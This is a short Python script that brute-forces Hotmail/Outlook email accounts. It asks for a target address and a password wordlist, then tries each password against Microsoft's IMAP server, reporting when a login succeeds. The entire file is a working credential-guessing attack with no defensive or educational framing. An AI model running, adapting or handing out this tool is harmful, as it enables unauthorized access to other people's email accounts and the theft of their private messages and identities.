import imaplib

user = input("Email: ")


def hotmail():
		imap2 = imaplib.IMAP4_SSL('imap-mail.outlook.com')
		email2 = user
		wordlist = input("Wordlist: ")
		wordlist = open(wordlist, 'r')
		for password in wordlist.readlines():
			try:
					imap2.login(email2,password)
					print("[ ! ] Logged-in with 0 Blocks %s" % password)
					quit()

			except imaplib.IMAP4.error as er:
				if "Invalid" in str(er):
					print("[ * ] Incorrect Credentials")
				else:
					print("[ - ] Not Logged-in")


hotmail()
